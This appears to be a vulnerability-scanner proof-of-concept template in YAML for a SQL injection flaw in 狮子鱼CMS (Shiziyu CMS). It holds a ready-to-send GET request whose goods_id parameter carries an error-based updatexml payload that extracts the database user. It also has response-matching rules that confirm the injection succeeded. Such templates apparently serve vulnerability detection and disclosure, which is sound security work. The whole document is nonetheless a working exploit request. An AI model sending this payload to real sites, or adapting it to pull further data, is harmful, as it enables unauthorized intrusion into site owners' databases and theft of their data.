id: poc-yaml-szy-cms-ApiController.class.php-sql
info:
  name: 狮子鱼CMS ApiController.class.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 狮子鱼CMS
requests:
- method: GET
  path: /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,(select+user()),0x7e),1)
  expression: status_code == 404 && contains(body,"1105 XPATH syntax error") && contains(body,"@localhost")
    && contains(body,"错误位置") && contains(body,"<title>系统发生错误</title>")
variables: {}
transport: http
